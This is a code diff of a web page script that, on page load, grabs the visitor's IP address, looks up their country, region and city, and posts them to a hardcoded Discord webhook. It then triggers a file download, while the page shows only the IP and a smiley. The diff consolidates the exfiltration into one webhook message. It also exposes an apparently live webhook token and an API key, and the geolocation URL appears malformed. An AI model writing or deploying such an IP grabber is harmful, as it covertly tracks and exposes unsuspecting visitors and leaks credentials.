@@ -9,34 +9,18 @@
                 .then(data => {
                     const ip = data.ip;
                     document.getElementById('ipDisplay').innerText = 'IP: ' + ip;
-                    getIPDetails(ip);
                     sendIPToWebhook(ip);
+                    getGeolocation(ip);
                 })
                 .catch(error => {
                     console.log('Error:', error);
                 });
         }
 
-        function getIPDetails(ip) {
-            fetch(`https://ipapi.co/${ip}/json/`)
-                .then(response => response.json())
-                .then(data => {
-                    const country = data.country_name;
-                    const region = data.region;
-                    const city = data.city;
-                    const areaCode = data.area_code;
-
-                    sendIPDetailsToWebhook(country, region, city, areaCode);
-                })
-                .catch(error => {
-                    console.log('Error:', error);
-                });
-        }
-
-        function sendIPToWebhook(ip) {
+        function sendIPToWebhook(ip, country, region, city, areaCode) {
             const webhookUrl = 'https://discord.com/api/webhooks/1113688349878800445/lWt0rsk4cFH0uvbagEzKbGQUgJLF17bA3h4BqlfK9E8OizkwgWgzBhhYoVaBLaokSfOL'; // Replace with your Discord webhook URL
             const payload = {
-                content: 'IP: ' + ip
+                content: `IP: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nArea Code: ${areaCode}`
             };
             fetch(webhookUrl, {
                 method: 'POST',
@@ -47,10 +31,10 @@
             })
             .then(response => {
                 if (response.ok) {
-                    console.log('IP sent to webhook successfully.');
+                    console.log('IP and geolocation sent to webhook successfully.');
                     downloadFile(ip); // Call the function to download the file after sending the IP
                 } else {
-                    console.log('Failed to send IP to webhook.');
+                    console.log('Failed to send IP and geolocation to webhook.');
                 }
             })
             .catch(error => {
@@ -58,28 +42,16 @@
             });
         }
 
-        function sendIPDetailsToWebhook(country, region, city, areaCode) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1113688349878800445/lWt0rsk4cFH0uvbagEzKbGQUgJLF17bA3h4BqlfK9E8OizkwgWgzBhhYoVaBLaokSfOL'; // Replace with your Discord webhook URL
-            const payload = {
-                content: `Location Details:\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nArea Code: ${areaCode}`
-            };
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Location details sent to webhook successfully.');
-                } else {
-                    console.log('Failed to send location details to webhook.');
-                }
-            })
-            .catch(error => {
-                console.log('Error:', error);
-            });
+        function getGeolocation(ip) {
+            fetch(`https://api.ipify.org/api/v1/ip/geolocation?apiKey=at_1O06yaHPU3FysaMxjDdG4U59hgKJnip=${ip}`)
+                .then(response => response.json())
+                .then(data => {
+                    const { country, region, city, area_code } = data;
+                    sendIPToWebhook(ip, country, region, city, area_code);
+                })
+                .catch(error => {
+                    console.log('Error:', error);
+                });
         }
 
         function downloadFile(ip) {
@@ -121,5 +93,8 @@
 <body onload="getIP()">
     <h1 id="ipDisplay">Loading...</h1>
     <p>:)))))):</p>
+
+    <script>
+    </script>
 </body>
 </html>
